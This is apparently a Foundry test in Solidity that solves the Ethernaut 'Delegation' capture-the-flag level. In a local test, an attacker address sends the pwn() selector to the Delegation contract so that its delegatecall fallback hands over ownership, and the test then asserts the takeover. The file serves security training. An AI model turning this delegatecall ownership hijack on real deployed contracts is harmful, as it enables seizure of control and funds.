// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Delegation.sol";


contract TestDelegation is Test {
    Delegation delegation;
    Delegate delegate;
    address deployer = address(0x51);
    address attacker = address(0x52);

    function setUp() external {
        vm.startPrank(deployer);
        delegate = new Delegate(deployer);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function testExploit() external {
        bytes memory data = abi.encodeWithSelector(delegate.pwn.selector);
        assertEq(delegation.owner(), deployer);
        vm.prank(attacker);
        (bool result, ) = address(delegation).call(data);
        require(result, "call failed");
        assertEq(delegation.owner(), attacker);
    }
}
